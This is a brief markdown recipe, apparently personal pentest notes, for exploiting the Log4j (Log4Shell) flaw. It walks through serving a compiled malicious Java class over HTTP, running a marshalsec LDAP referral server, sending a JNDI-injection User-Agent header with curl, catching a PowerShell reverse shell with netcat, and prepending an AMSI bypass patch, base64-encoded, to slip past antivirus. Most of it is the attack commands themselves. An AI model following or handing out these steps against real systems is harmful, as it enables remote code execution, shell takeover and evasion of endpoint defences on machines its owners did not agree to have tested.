# Log4j Vulnerability

## Sources

* [Java - Apache Log4j 2 Library](https://logging.apache.org/log4j/2.x/)
* [John Hammond Log4j POC Video](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1481s)
* [Initial Github Repository For Log4j POC](https://github.com/xiajun325/apache-log4j-rce-poc)
* [Github Repository - Log4j POC](https://github.com/leonjza/log4jpwn)
* [Github - Powershell Reverse Shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

## Method

Compile `Log4j.java` file :
```
javac Log4j.java
```

Start a HTTP server with Python :
```
python3 -m http.server 8080
```

Start LDAP server :
```
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8080/#Log4j"
```

Send poisonned request to server :
```
curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Log4j}' localhost:8080
```

## Reverse shell

Create `netcat` connection to receive the access to the reverse shell :
```
nc -lnvp 8080
```

Get [this](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) Powershell script and edit the IP address and the port to match with the target.

Then, go on [AMSI.fail](https://amsi.fail/) wbesite and copy a `Rasta-mouses Amsi-Scan-Buffer patch`. Encode the previous Rasta-mouses patch followed by the Powershell script into Base64 thanks to a [Powershell encoder](https://raikia.com/tool-powershell-encoder).

Adapt the code in `Log4j.java` file to run the corresponding command then compile :
```
javac Log4j.java
```